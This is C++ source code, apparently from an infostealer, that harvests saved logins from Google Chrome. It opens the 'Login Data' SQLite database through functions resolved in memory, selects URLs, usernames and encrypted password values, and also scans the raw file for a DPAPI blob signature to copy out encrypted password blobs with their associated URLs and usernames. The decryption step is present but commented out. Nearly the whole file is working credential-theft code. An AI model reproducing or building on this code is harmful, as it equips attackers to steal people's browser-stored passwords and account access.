
//  -About-
//  PlEASE REFER TO readme.md for more information on locating the start of the encrypted password BLOB ***/
//  After manually analysing Chrome's 'Login Data',I figured out that each encrypoted password BLOB
//  starts with the these 16 bytes
//  Infact there also exits another 4 bytes which worked on 3 of my 4 laptops during testing
//  I decided to use the 16 bytes for realability

#include <windows.h>
#include <stdio.h>

#include "database.h"
#include "utility.h"
#include "memory.h"
#include "module.h"

						 
//  The necessary functions pointer typedefs from the sqlite3.dll
    pOpen       SqlOpen;
    pPrepareV2  SqlPrepareV2;
    pStep       SqlStep;
    pColumnText SqlColumnText;
    pFinalize   SqlFinalize;
    pClose      SqlClose;

//  The MemoryGetProcAddress API parses a DLL export table and resolve function
//  names corresonponding the the given functions names
void ResolveFunctionAddr(HANDLE hModule)
{
	SqlOpen = (pOpen)MemoryGetProcAddress(hModule,"sqlite3_open");
	SqlPrepareV2 = (pPrepareV2)MemoryGetProcAddress(hModule,"sqlite3_prepare_v2");
	SqlStep = (pStep)MemoryGetProcAddress(hModule,"sqlite3_step");
	SqlColumnText = (pColumnText)MemoryGetProcAddress(hModule,"sqlite3_column_text");
	SqlFinalize = (pFinalize)MemoryGetProcAddress(hModule,"sqlite3_finalize");
	SqlClose = (pClose)MemoryGetProcAddress(hModule,"sqlite3_close");
}


void Database::SQLParsing (char *databasePath, HANDLE hSQLModule)
{	
    //Resolve the address of the required functions from the sqlite dll
    if (hSQLModule)
	{
            ResolveFunctionAddr(hSQLModule);
			
            sqlite3_stmt *stmt;
            sqlite3 *db;
  
           char *query = "SELECT origin_url, username_value, password_value FROM logins";
            //Open the database
            if (SqlOpen(databasePath, &db) == SQLITE_OK) 
			{
                if (SqlPrepareV2(db, query, -1, &stmt, 0) == SQLITE_OK) 
				{
					char *passBuffer = NULL;
					passBuffer = (char*)VirtualAlloc(NULL, 256, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

                    while (SqlStep(stmt) == SQLITE_ROW) 
					{
                        //While we still have data in database
                        char *url = (char *)SqlColumnText(stmt,0);
                        char *username = (char *)SqlColumnText(stmt,1);
                        BYTE *password = (BYTE *)SqlColumnText(stmt,2); //This is the only encrypted field
                        printf("Url: %s\n",url);
                        printf("Username: %s\n",username); 
                        //char *decrypted = Crack(password);						
						//DecryptPassword(password, &passBuffer, 230);                        
                    }
                }
                SqlFinalize(stmt);
                SqlClose(db);
            }
        }
     exit:

    return;
}


int Database::RawBinaryParsing( uint8_t* input, int inputSize, uint8_t***ppBLOB, char**& login_info1/*char** &login_info*/)
{   
    //The 16 bytes presiding the start of the encrypted (BLOB) password
   	unsigned char startEcryptedBLOB[] = {0x01, 0x00, 0x00, 0x00,0xD0, 0x8C, 0x9D, 0xDF, 
										 0x01, 0x15, 0xD1, 0x11, 0x8C, 0x7A, 0x00, 0xC0};
	//The 8 bytes presiding the start of the username/email and website									 
    unsigned char startCrendentials[] = {0x68, 0x74, 0x74, 0x70, 0x73, 0x3A, 0x2F, 0x2F}; //  Hexadecimal => ANSI equivalent of 'https://' 
	
	int szEncryptedBLOB = 230; // The encrypted password BLOD has a fixed of 230 bytes.
	int szStartBLOB = 16;      // 
	int szStartCRED = 8;       //
	    
	STRING TString;// Custom class for string manupilation
	uint8_t* endFile = input + inputSize;
	uint8_t* start = input;
	int count = 0, szSize;
	*ppBLOB = NULL;
	
	while(input < endFile)
	{          
		uint8_t* currentPos = input;	  
		if((currentPos < endFile) && (Memory::_memcmp(currentPos, startEcryptedBLOB, szStartBLOB) == 0))
		{	
			szSize = 0;
			if(Memory::_realloc(ppBLOB, (count + 1) * sizeof(LPBYTE)))
			{
				uint8_t* p = NULL;
				if((p = (uint8_t *)HeapAlloc((GetProcessHeap()), HEAP_ZERO_MEMORY, szEncryptedBLOB)) != NULL)  
				{
					Memory::_memcpy(p, currentPos, szEncryptedBLOB);
					(*ppBLOB)[count] = p;
				}
			}
			uint8_t* curCredentials = currentPos;
			while(curCredentials > start)
			{			
				curCredentials--;
				szSize++;
				if ((Memory::_memcmp(curCredentials, startCrendentials, szStartCRED) == 0))
				{					
					char* p = NULL;
					p = (char*)HeapAlloc((GetProcessHeap()), HEAP_ZERO_MEMORY, (szSize+1)*sizeof(char*));  
					Memory::_memcpy(p, curCredentials, szSize);
					login_info1[count] = p;		
					break;
				}
			}		
			count++;
		}		  
		currentPos++;
		input = currentPos;
	}
	return count;
}

